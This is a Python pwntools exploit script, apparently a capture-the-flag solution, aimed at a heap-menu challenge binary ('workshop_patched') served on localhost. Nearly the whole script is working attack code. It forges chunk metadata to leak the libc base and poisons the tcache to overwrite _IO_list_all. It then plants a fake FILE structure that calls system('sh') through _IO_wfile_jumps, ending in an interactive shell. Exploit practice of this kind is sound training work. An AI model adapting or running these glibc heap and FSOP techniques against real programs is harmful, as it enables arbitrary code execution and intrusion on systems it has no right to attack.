#!/usr/bin/env python3
from pwn import *

PORT = 13334
HOST = "localhost"
elf = context.binary = ELF('./workshop_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x0000000000001555
            brva 0x0000000000001715
            brva 0x000000000000190B
            brva 0x0000000000001837
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def menu(opt):
    sla(b'> ', str(opt).encode())

def prepare(idx, sz):
    menu(1)
    sla(b'Gift Slot: ', str(idx).encode())
    sla(b'Gift Size: ', str(sz).encode())

def rewrite(idx, dt):
    menu(2)
    sla(b'Gift Slot: ', str(idx).encode())
    sa(b'Card Message: ', dt)

def check(idx):
    menu(3)
    sla(b'Gift Slot: ', str(idx).encode())

def deliver(idx):
    menu(4)
    sla(b'Gift Slot: ', str(idx).encode())

def close():
    menu(5)

p.recvuntil(b'\nHo...Ho...Ho..')
heap = (int(p.recvline().strip(), 16) >> 12) << 12
log.info(f'heap_base: {hex(heap)}')

# Stage 1: Leak libc

prepare(0, 0x538)
prepare(1, 0x500-8)
prepare(2, 0x60)

pl = flat(
    heap + 0x2e0, heap + 0x2e0,
    0, 0, 0, 0, 
    heap + 0x2b0, heap + 0x2b0,
    )

pl = pl.ljust(0x530, b'A') + p64(0x540)

rewrite(0, pl)

deliver(1)
# GDB()
check(0)
p.recvuntil('Contents: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
log.success(f'libc_base: {hex(libc.address)}')

# Stage 2: FSOP

prepare(4, 0x100)
prepare(5, 0x100)
prepare(6, 0x100)
fake = heap + 0x4e0

pl = flat({
    0x00: b'  sh\x00\x00\x00\x00',
    0x20: 1,
    0x30: 0,
    0x68: libc.sym.system,  
    0x88: fake + 0x200,     
    0xa0: fake,      
    0xc0: 1, 
    0xd8: libc.sym._IO_wfile_jumps,
    0xe0: fake
    }, filler = b'\x00')


rewrite(6, pl)
# prepare(8, 0x850)

deliver(5)
deliver(4)
rewrite(0, p64(0) + p64(0))

deliver(0)

prepare(7, 0x100)
rewrite(7, p64((heap >> 12) ^ libc.sym._IO_list_all))
# GDB()
prepare(8, 0x100)
prepare(9, 0x100)
rewrite(9, p64(fake))

close()
p.interactive()